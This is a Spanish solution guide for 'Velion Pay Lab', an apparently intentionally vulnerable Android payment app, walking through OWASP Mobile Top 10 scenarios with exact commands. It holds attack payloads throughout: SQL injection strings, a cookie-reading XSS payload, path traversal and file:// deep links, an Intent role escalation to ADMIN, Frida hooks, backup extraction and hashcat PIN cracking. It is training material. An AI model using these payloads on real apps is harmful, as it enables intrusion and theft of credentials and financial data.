# Velion Pay Lab — Guía de Solución

> Cada categoría tiene **3 escenarios**. Para cada uno se indica la herramienta, el comando exacto y el resultado esperado.

---

## Requisitos previos

### Herramientas

| Herramienta | Instalación |
|---|---|
| `adb` | Android Platform Tools |
| `Android Studio` | https://developer.android.com/studio?hl=es-419 |
| `jadx` | `brew install jadx` |
| `apktool` | `brew install apktool` |
| `aapt` | incluido en Android SDK build-tools |
| `Burp Suite Community` | portswigger.net |
| `Frida` | `pip install frida-tools` |
| `drozer` | github.com/WithSecureLabs/drozer |
| `sqlite3` | incluido en macOS/Linux |
| `Python 3` + `pycryptodome` | `pip install pycryptodome` |
| `hashcat` | `brew install hashcat` |
| Android Backup Extractor (`abe.jar`) | github.com/nelenkov/android-backup-extractor |

### Preparación del dispositivo / emulador

```bash
# Instalar la app
adb install velion-pay-lab.apk

# Verificar que está instalada
adb shell pm list packages | grep velion

# Extraer el APK del dispositivo para análisis estático
adb shell pm path com.velion.dvma
# Salida: package:/data/app/~~XXXX/com.velion.dvma-XXXX/base.apk
adb pull /data/app/~~XXXX/com.velion.dvma-XXXX/base.apk velion.apk

# Descompilar con jadx (análisis estático completo)
jadx -d velion_src velion.apk

# Descompilar con apktool (smali + manifest)
apktool d velion.apk -o velion_apktool
```

---

## M1 · Improper Credential Usage

**Vulnerabilidades:** credenciales hardcoded, token en Logcat, PIN hardcoded.

### Escenario 1 — Credenciales de pasarela hardcoded en el APK

```bash
# Buscar credenciales en el código fuente descompilado
grep -r "GW_CLIENT_SECRET\|GW_CLIENT_ID\|client-secret\|merchant-mobile" velion_src/

# Buscar en strings del APK empaquetado
grep -r "lab-gateway\|client-secret" velion_apktool/smali/
```

**Resultado esperado:**
```
GW_CLIENT_ID     = "merchant-mobile"
GW_CLIENT_SECRET = "lab-gateway-client-secret-9f2a"
```

---

### Escenario 2 — Token de sesión en Logcat

```bash
# En la app: pulsar "Renovar sesión activa"
# Capturar el log en tiempo real
adb logcat -s VelionPay
```

**Resultado esperado:**
```
D VelionPay: Renovando sesión con Bearer demo-session-token-7f9a
```

---

### Escenario 3 — PIN de soporte hardcoded en Logcat

```bash
# En la app: pulsar "Verificar identidad con soporte"
adb logcat -s VelionPay
```

**Resultado esperado:**
```
I VelionPay: identity-check-pin=824913
```

---

## M2 · Inadequate Supply Chain Security

**Vulnerabilidades:** actualización sin firma, validación de partner por nombre (no certificado), rollback sin integridad.

### Escenario 1 — APK de módulo descargado sin verificación de firma

```bash
# Buscar la lógica de actualización en el código
grep -r "sha256\|signature\|verify\|checksum" velion_src/com/velion/dvma/m2.java

# El sha256 viene del mismo JSON del CDN — no hay clave pública independiente
# Un atacante con control del CDN puede sustituir el APK por uno malicioso
# y actualizar el campo sha256 en el mismo JSON
```

**Resultado esperado:** no hay verificación criptográfica independiente; `sha256` es autorreferencial.

---

### Escenario 2 — Partner validado solo por nombre de paquete

```bash
# Ver la validación en el código
grep -A 10 "allowedPackages" velion_src/com/velion/dvma/m2.java

# Un APK firmado con diferente certificado pero con nombre "com.velion.receipts"
# pasa la validación. Demostración con Frida:
frida -U -p $(adb shell pidof com.velion.dvma) --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida
# Hook sobre installPartnerExtension para ver el paquete aceptado sin verificar certificado
```

**Resultado esperado:** `allowedPackages.contains(requestedPackage)` devuelve `true` sin comprobar firma APK.

---

### Escenario 3 — Rollback sin verificación criptográfica

```bash
# Buscar cómo se selecciona el bundle de rollback
grep -A 8 "rollbackRelease\|provenance" velion_src/com/velion/dvma/m2.java

# release-channel.json es un archivo local que puede modificarse
# en un dispositivo rooteado antes de que la app lo procese
adb shell run-as com.velion.dvma ls files/
# Si existiera release-channel.json, podría sustituirse sin restricción
```

---

## M3 · Insecure Authentication / Authorization

**Vulnerabilidades:** PERSONAL con acceso de OPS, rol override vía Intent, logout solo local.

### Escenario 1 — Rol PERSONAL accede al panel de operaciones

```bash
# Abrir el módulo M3 con el rol por defecto (PERSONAL)
adb shell am start -n com.velion.dvma/.m3

# Pulsar "Abrir panel de operaciones" — PERSONAL tiene acceso igual que OPS
# Verificar en el código la condición rota:
grep -A 5 "openOperationsPanel" velion_src/com/velion/dvma/m3.java
```

**Resultado esperado:** el panel muestra "Cola de liquidación / Revisión de contracargos" con rol PERSONAL.

---

### Escenario 2 — Escalada de rol vía Intent extra

```bash
# Inyectar rol arbitrario al lanzar la Activity
adb shell am start -n com.velion.dvma/.m3 --es role "ADMIN"

# Pulsar "Cambiar contexto de cuenta"
# El rol en FeatureStore queda como "ADMIN" sin validación del servidor
```

**Resultado esperado:** `Rol: ADMIN` en la pantalla; ninguna petición al backend.

---

### Escenario 3 — Sesión remota activa tras cerrar sesión local

```bash
# Pulsar "Cerrar sesión" en la app
# Verificar que el token sigue en SharedPreferences
adb shell run-as com.velion.dvma \
  cat shared_prefs/com.velion.dvma_preferences.xml

# El token nunca se revoca en el servidor — sigue válido 72 horas
grep -A 8 "signOut" velion_src/com/velion/dvma/m3.java
```

**Resultado esperado:** `logged_in=false` en local pero el token sigue operativo en el servidor.

---

## M4 · Insufficient Input / Output Validation

**Vulnerabilidades:** open redirect en WebView, path traversal en descarga, XSS en búsqueda.

### Escenario 1 — Open redirect / LFI vía deep link

```bash
# Redirigir el WebView a un sitio externo
adb shell am start -a android.intent.action.VIEW \
  -d "velionpay://portal?url=https://evil.example.com" \
  com.velion.dvma

# Leer archivos internos de la app (LFI)
adb shell am start -a android.intent.action.VIEW \
  -d "velionpay://portal?url=file:///data/data/com.velion.dvma/shared_prefs/account_cache.xml" \
  com.velion.dvma
```

**Resultado esperado:** el WebView carga el dominio arbitrario o muestra el XML de SharedPreferences.

---

### Escenario 2 — Path traversal en nombre de archivo de estado

```bash
# Sobreescribir un archivo fuera del directorio "statements/"
adb shell am start -n com.velion.dvma/.m4 \
  --es name "../../../../../../data/data/com.velion.dvma/files/audit.txt"

# El archivo resultante quedaría fuera del directorio previsto
```

**Resultado esperado:** `Ruta: /sdcard/.../../../files/audit.txt` — el archivo se escribe en una ruta no autorizada.

---

### Escenario 3 — XSS reflejado en WebView de búsqueda

```bash
# Inyectar payload HTML/JS en el campo de búsqueda
adb shell am start -n com.velion.dvma/.m4 \
  --es query "<img src=x onerror=alert(document.cookie)>"

# El valor de query se concatena directamente en el HTML sin escapar
```

**Resultado esperado:** el WebView ejecuta el script; se muestra el alert con cookies/storage.

---

## M5 · Insecure Communication

**Vulnerabilidades:** HTTP con token de auth, TLS completamente deshabilitado.

### Escenario 1 — Token Bearer enviado por HTTP

```bash
# Configurar Burp Suite como proxy en el dispositivo (puerto 8080)
# Settings > WiFi > Proxy manual > IP_DEL_HOST:8080

# Pulsar "Sincronizar perfil" en la app
# Capturar en Burp:
```

**Tráfico interceptado esperado:**
```
GET http://api.velion.local/profile HTTP/1.1
Authorization: Bearer demo-session-token-7f9a
```

---

### Escenario 2 — Bypass de validación TLS

```bash
# Levantar mitmproxy con certificado autofirmado
mitmproxy --listen-port 8080

# Pulsar "Verificar cotización de envío"
# La app acepta cualquier certificado (TrustManager vacío + HostnameVerifier = true)

# Verificar en el código el TrustManager que acepta todo:
grep -A 10 "checkServerTrusted\|HostnameVerifier" velion_src/com/velion/dvma/m5.java
```

**Resultado esperado:** mitmproxy muestra el tráfico HTTPS descifrado; la app no lanza `SSLHandshakeException`.

---

### Escenario 3 — Estado de servicios (referencia)

```bash
# Este escenario no tiene vector de ataque activo;
# sirve para contrastar con los anteriores.
# Pulsar "Estado de servicios" en la app
```

---

## M6 · Inadequate Privacy Controls

**Vulnerabilidades:** PII en SharedPreferences, datos financieros en portapapeles, estado sin redactar.

### Escenario 1 — PII completo en SharedPreferences

```bash
# Pulsar "Preparar caso de soporte" en la app
# Leer el archivo generado
adb shell run-as com.velion.dvma \
  cat shared_prefs/support_draft.xml
```

**Resultado esperado:**
```xml
<string name="customer_context">
  email=demo.user@velion.local;phone=+50255550142;account=ACC-1042;balance=18425.75
</string>
```

---

### Escenario 2 — Datos bancarios en el portapapeles del sistema

```bash
# Pulsar "Copiar datos de beneficiario" en la app
# Leer el portapapeles desde otra app o con Frida
frida -U -p $(adb shell pidof com.velion.dvma) -e "
Java.perform(function() {
  var ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
  var cm = ctx.getSystemService('clipboard');
  console.log('Portapapeles: ' + cm.getPrimaryClip().getItemAt(0).getText());
});
"
```

**Resultado esperado:** `Portapapeles: Acme Services · AC-8821 · routing 110000`

---

### Escenario 3 — Captura de pantalla con datos sin redactar

```bash
# Pulsar "Vista previa del estado de cuenta" en la app
adb shell screencap -p /sdcard/leak.png
adb pull /sdcard/leak.png

# La imagen contiene email, cuenta y saldo en texto claro
```

---

## M7 · Insufficient Binary Protections

**Vulnerabilidades:** `debuggable=true`, `trusted_device` sin Play Integrity, exposición de library/ABI.

### Escenario 1 — App debuggable en producción

```bash
# Verificar flag en el manifest descompilado
grep "debuggable" velion_apktool/AndroidManifest.xml
# → android:debuggable="true"

# Adjuntar debugger JDWP
adb jdwp
# Tomar el PID de la app y hacer forward
adb forward tcp:8700 jdwp:<PID>
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
```

**Resultado esperado:** jdb se conecta y permite inspeccionar variables en tiempo de ejecución.

---

### Escenario 2 — Activar funciones de pago sin Play Integrity

```bash
# Inyectar trusted_device=true vía Intent
adb shell am start -n com.velion.dvma/.m7 --ez trusted_device true
```

**Resultado esperado:** `Dispositivo de confianza: true` y funciones de pago habilitadas, sin ninguna verificación real del dispositivo.

---

### Escenario 3 — Exposición de nombre de librería y ABI

```bash
# Pulsar "Verificar capacidad nativa" en la app
# Ver el nombre de la librería y ABI expuestos en pantalla

# Buscar referencias en el código
grep -r "libvelionpay\|SUPPORTED_ABIS" velion_src/com/velion/dvma/m7.java
```

**Resultado esperado:** `Biblioteca: libvelionpay.so / ABI: arm64-v8a` — información útil para un atacante que busca vulnerabilidades en la capa nativa.

---

## M8 · Security Misconfiguration

**Vulnerabilidades:** AdminActivity exported sin auth, WebView + file access en soporte, backup de token.

### Escenario 1 — Acceso directo a AdminActivity (exported=true)

```bash
# Cualquier app (o adb) puede invocarla sin autenticación
adb shell am start -n com.velion.dvma/.AdminActivity

# Verificar con drozer
drozer console connect
dz> run app.activity.info -a com.velion.dvma
dz> run app.activity.start --component com.velion.dvma com.velion.dvma.AdminActivity
```

**Resultado esperado:** "Consola de Operaciones" visible sin haber hecho login.

---

### Escenario 2 — WebView con file access en centro de soporte

```bash
# Pulsar "Abrir centro de soporte" — carga file:///android_asset/support/index.html
# con setAllowFileAccess(true) y JS habilitado

# Inyectar un link malicioso en el HTML del asset (si el asset es reemplazable)
# o usar el deep link para redirigir el WebView a file:// interno
adb shell am start -a android.intent.action.VIEW \
  -d "velionpay://portal?url=file:///data/data/com.velion.dvma/shared_prefs/account_cache.xml" \
  com.velion.dvma
```

---

### Escenario 3 — Token de sesión en Android Backup

```bash
# Pulsar "Crear snapshot de diagnóstico" en la app
# Generar backup del APK
adb backup -noapk com.velion.dvma -f backup.ab

# Desempaquetar con Android Backup Extractor
java -jar abe.jar unpack backup.ab backup.tar ""
tar xf backup.tar

# Leer SharedPreferences extraídas del backup
cat apps/com.velion.dvma/sp/diagnostics.xml
```

**Resultado esperado:**
```xml
<string name="session">demo-session-tok en-7f9a</string>
<string name="last_user">demo.user@velion.local</string>
```

---

## M9 · Insecure Data Storage

**Vulnerabilidades:** token en SharedPreferences, SQL injection, auditoría en texto plano.

### Escenario 1 — Token de sesión en SharedPreferences

```bash
# Pulsar "Abrir caché de cuenta offline" en la app
adb shell run-as com.velion.dvma \
  cat shared_prefs/account_cache.xml
```

**Resultado esperado:**
```xml
<string name="session_token">demo-session-token-7f9a</string>
<string name="email">demo.user@velion.local</string>
<string name="account_number">001-7788-1042</string>
```

---

### Escenario 2 — SQL Injection en historial de transacciones

```bash
# Payload básico — volcar todas las filas
adb shell am start -n com.velion.dvma/.m9 \
  --es ref "x' OR '1'='1"

# Payload con comentario SQL
adb shell am start -n com.velion.dvma/.m9 \
  --es ref "x' OR 1=1 --"

# Acceso directo a la base de datos (dispositivo rooteado / emulador)
adb shell run-as com.velion.dvma \
  sqlite3 databases/velion.db "SELECT * FROM transactions"
```

**Resultado esperado:** todos los registros de `transactions` se muestran en pantalla, independientemente del valor de `ref`.

---

### Escenario 3 — Archivo de auditoría con token en texto plano

```bash
# Pulsar "Exportar auditoría local" en la app
adb shell run-as com.velion.dvma cat files/audit.txt
```

**Resultado esperado:**
```
USER=demo.user@velion.local
SESSION=demo-session-token-7f9a
```

---

## M10 · Insufficient Cryptography

**Vulnerabilidades:** MD5 sin salt, AES/ECB con clave hardcoded, AES/CBC con IV cero.

### Escenario 1 — PIN protegido con MD5 sin salt

```bash
# Pulsar "Proteger PIN offline" — obtener el hash de pantalla o de SharedPreferences

# Identificar el algoritmo en el código
grep -A 6 "md5\|MD5" velion_src/com/velion/dvma/m10.java

# Crackear con hashcat (el hash es MD5 puro, sin salt)
# Convertir el Base64 a hex primero
python3 -c "import base64; print(base64.b64decode('HASH_BASE64_AQUI').hex())" > hash.hex
hashcat -a 3 -m 0 hash.hex ?d?d?d?d
# PINs de 4 dígitos se rompen en segundos

# Alternativa con tabla arcoíris online: crackstation.net
```

**Resultado esperado:** PIN `2468` recuperado en segundos.

---

### Escenario 2 — AES/ECB con clave hardcoded

```bash
# Extraer la clave del código descompilado
grep "AES_KEY\|VelionLabKey" velion_src/com/velion/dvma/m10.java
# → AES_KEY = "VelionLabKey2026"

# Pulsar "Cifrar borrador de transferencia" — copiar el payload de pantalla

# Descifrar con Python
python3 << 'EOF'
from Crypto.Cipher import AES
import base64

key     = b"VelionLabKey2026"          # hardcoded en el APK
payload = "PAYLOAD_BASE64_DE_PANTALLA"
ct      = base64.b64decode(payload)
cipher  = AES.new(key, AES.MODE_ECB)
print(cipher.decrypt(ct))
EOF
```

**Resultado esperado:** `b'TRX|ACC-1042|1250.00|USD\x08\x08\x08\x08\x08\x08\x08\x08'`

---

### Escenario 3 — AES/CBC con IV fijo en ceros

```bash
# Pulsar "Preparar sesión offline" — copiar el payload de pantalla

# Descifrar con Python (clave y IV conocidos estáticamente)
python3 << 'EOF'
from Crypto.Cipher import AES
import base64

key     = b"VelionLabKey2026"
iv      = b"\x00" * 16               # IV fijo en ceros — hardcoded en el APK
payload = "PAYLOAD_BASE64_DE_PANTALLA"
ct      = base64.b64decode(payload)
cipher  = AES.new(key, AES.MODE_CBC, iv)
pt      = cipher.decrypt(ct)
# Quitar padding PKCS5
print(pt[: -pt[-1]])
EOF
```

**Resultado esperado:** `b'demo-session-token-7f9a'`

---

## Resumen rápido de vectores

| # | Herramienta principal | Comando de entrada |
|---|---|---|
| M1 | `adb logcat`, `jadx` | Interacción en la app + `grep` en fuente |
| M2 | `jadx`, Burp Suite | Análisis estático + intercepción de red |
| M3 | `adb shell am start` | `--es role "ADMIN"` |
| M4 | `adb shell am start` | `--es query "<img onerror=...>"` / deep link `?url=file://` |
| M5 | Burp Suite / mitmproxy | Proxy en el dispositivo |
| M6 | `adb shell run-as`, Frida | `cat shared_prefs/support_draft.xml` |
| M7 | `jdb`, `adb shell am start` | `--ez trusted_device true` |
| M8 | `adb shell am start`, `abe.jar` | `.AdminActivity` directo + backup extract |
| M9 | `adb shell run-as`, sqlite3 | `--es ref "x' OR 1=1 --"` |
| M10 | `jadx`, Python pycryptodome | Clave `VelionLabKey2026` + IV `\x00*16` |
